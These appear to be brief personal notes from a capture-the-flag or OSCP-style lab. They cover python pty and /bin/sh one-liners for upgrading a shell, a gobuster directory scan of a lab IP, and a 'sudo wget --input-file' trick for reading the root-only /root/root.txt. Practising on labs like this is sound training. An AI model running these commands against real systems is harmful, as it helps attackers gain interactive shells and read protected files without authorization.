### upgrading shells

https://sushant747.gitbooks.io/total-oscp-guide/content/spawning_shells.html

```
python -c 'import pty; pty.spawn("/bin/sh")'
python3 -c 'import pty; pty.spawn("/bin/sh")'

/bin/sh -i
```

gobuster dir --url https://10.129.240.189 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k

using wget to reveal the text as /root/root

sudo wget --input-file /root/root.txt
